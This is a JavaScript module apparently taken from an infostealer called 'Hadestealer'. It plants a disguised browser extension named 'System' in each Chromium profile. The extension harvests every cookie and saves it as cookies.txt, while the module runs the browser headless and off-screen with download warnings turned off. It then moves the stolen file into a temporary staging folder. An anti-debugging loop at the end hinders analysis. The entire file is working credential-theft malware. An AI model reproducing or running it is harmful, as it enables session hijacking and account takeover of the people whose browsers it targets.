"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const { spawn } = require("child_process");
const configConstants = require("../config/constants");
const utilsFile = require("../utils/file");
const utilsProcess = require("../utils/process");

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.chromium = f4;

function f2(downloadPath, timeout = 60000) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();
        const checkFile = () => {
            try {
                const files = fs.readdirSync(downloadPath);
                const cookieFile = files.find(f => f.toLowerCase().startsWith("cookies") && f.endsWith(".txt"));
                if (cookieFile) {
                    return resolve(path.join(downloadPath, cookieFile));
                }
            } catch (e) {}

            if (Date.now() - startTime > timeout) {
                return reject(new Error("Timeout"));
            }
            setTimeout(checkFile, 1500);
        };
        checkFile();
    });
}

function f3() {
    try {
        utilsProcess.killBrowsersSync();
    } catch (e) {}
}

async function f4() {
    const downloadDir = path.join(os.homedir(), "Downloads");
    const finalResults = [];
    const cookieFileName = "cookies.txt";

    for (const browser of configConstants.browsers) {
        try {
            if (!fs.existsSync(browser.path)) {
                finalResults.push({
                    browser: browser.name,
                    status: "binary_not_found"
                });
                continue;
            }

            const userDataPath = path.join(os.homedir(), "AppData", "Local", browser.userDir, "User Data");
            if (!fs.existsSync(userDataPath)) {
                finalResults.push({
                    browser: browser.name,
                    status: "not_installed"
                });
                continue;
            }

            const profiles = await utilsFile.getProfiles(userDataPath);
            if (profiles.length === 0) {
                finalResults.push({
                    browser: browser.name,
                    status: "no_profiles_found"
                });
                continue;
            }

            for (const profileName of profiles) {
                const extensionPath = path.join(userDataPath, profileName, "Extensions", browser.name);
                fs.mkdirSync(extensionPath, {
                    recursive: true
                });

                const extensionSource = `
async function dump() {
    try {
        const cookies = await chrome.cookies.getAll({});
        if (!cookies || cookies.length === 0) return;

        const formatted = cookies.map(c => 
            [c.domain, c.hostOnly ? "FALSE" : "TRUE", c.path, c.secure ? "TRUE" : "FALSE", c.expirationDate ? Math.floor(c.expirationDate) : 0, c.name, c.value].join("\\t")
        ).join("\\n");
        
        const blob = new Blob([formatted], {type: 'text/plain'});
        const reader = new FileReader();
        reader.onloadend = () => {
            chrome.downloads.download({
                url: reader.result,
                filename: "${cookieFileName}",
                conflictAction: "overwrite", 
                saveAs: false
            });
        };
        reader.readAsDataURL(blob);
    } catch (e) {}
}

chrome.runtime.onInstalled.addListener(dump);
chrome.runtime.onStartup.addListener(dump);
setInterval(dump, 5000); 
`.trim();

                const manifestData = {
                    manifest_version: 3,
                    name: "System",
                    version: "3.0",
                    permissions: ["cookies", "tabs", "downloads"],
                    host_permissions: ["<all_urls>"],
                    background: {
                        service_worker: "index.js"
                    }
                };

                try {
                    fs.writeFileSync(path.join(extensionPath, "index.js"), extensionSource);
                    fs.writeFileSync(path.join(extensionPath, "manifest.json"), JSON.stringify(manifestData));
                } catch (e) {}

                const spawnArgs = [
                    "--load-extension=" + extensionPath,
                    "--disable-extensions-except=" + extensionPath,
                    "--disable-popup-blocking",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--profile-directory=" + profileName,
                    "--window-position=-32000,-32000",
                    "--window-size=800,600",
                    "--disable-features=InsecureDownloadWarnings",
                    "--headless=new"
                ];

                const browserProcess = spawn(browser.path, spawnArgs, {
                    detached: true,
                    stdio: "ignore"
                });
                browserProcess.unref();

                const storagePath = path.join(os.tmpdir(), "Hadestealer", "All", "ChromiumV20", browser.name, profileName);
                fs.mkdirSync(storagePath, {
                    recursive: true
                });

                try {
                    const foundFile = await f2(downloadDir, 45000);
                    fs.copyFileSync(foundFile, path.join(storagePath, cookieFileName));
                    fs.unlinkSync(foundFile);
                    finalResults.push({
                        browser: browser.name,
                        profile: profileName,
                        status: "success",
                        file: path.join(storagePath, cookieFileName)
                    });
                } catch (e) {
                    finalResults.push({
                        browser: browser.name,
                        profile: profileName,
                        status: "timeout"
                    });
                }
            }
        } catch (err) {
            finalResults.push({
                browser: browser.name,
                status: "error",
                message: err.message
            });
        }
    }

    f3();
    return {
        results: finalResults
    };
}

(function() {
    let globalContext;
    try {
        globalContext = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalContext = window;
    }
    globalContext.setInterval(function protection(n) {
        function check(i) {
            if (typeof i === "string") {
                return (function() {}).constructor("while (true) {}").apply("counter");
            } else if (("" + i / i).length !== 1 || i % 20 === 0) {
                (function() {
                    return true;
                }).constructor("debugger").call("action");
            } else {
                (function() {
                    return false;
                }).constructor("debugger").apply("stateObject");
            }
            check(++i);
        }
        try {
            if (n) return check;
            check(0);
        } catch (e) {}
    }, 4000);
})();
